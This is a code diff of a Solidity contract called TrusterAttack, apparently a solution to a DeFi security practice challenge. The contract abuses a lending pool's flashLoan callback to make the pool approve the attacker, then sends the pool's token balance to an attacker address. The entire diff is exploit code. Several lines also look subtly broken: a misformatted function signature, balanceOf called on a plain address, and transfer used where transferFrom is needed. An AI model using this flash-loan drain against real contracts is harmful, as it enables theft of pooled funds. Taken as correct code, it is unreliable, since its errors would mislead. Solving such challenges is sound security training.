@@ -15,20 +15,26 @@ interface IPoolFunc {
 contract TrusterAttack {
     using Address for address;
 
+    address public immutable pool;
+    IERC20 public immutable token;
+    address public immutable attacker;
+    uint256 public balance;
+
     constructor(address poolAddress,
                 address tokenAddress,
                 address attackerAddress
-                )
+               ) 
     {
         //Idea
+        pool = poolAddress;
+        token = IERC20(tokenAddress);
+        attacker = attackerAddress;
+        balance = tokenAddress.balanceOf(pool);
 
-        //call flashLoan with x borrowAmount, borrower = this
-        //target = token 
-        uint256 balance = IERC20(tokenAddress).balanceOf(poolAddress);
-        IPoolFunc(poolAddress).flashLoan(
+        IPoolFunc(pool).flashLoan(
             0,
-            attackerAddress,
-            tokenAddress,
+            address(this),
+            token,
             abi.encodeWithSignature(
                 "approve(address, uint256)",
                 address(this),
@@ -41,9 +47,8 @@ contract TrusterAttack {
         //token.tranfser(amount,attacker)
         //
     }
-    function transferMe(address poolAddress, address tokenAddress, address attackerAddress) public{
-        uint256 balance2 = IERC20(tokenAddress).balanceOf(poolAddress);
-        IERC20(tokenAddress).transfer(attackerAddress, balance2);
+    function transferMe() public{
+        token.transfer(attacker, balance);
     }
 
    
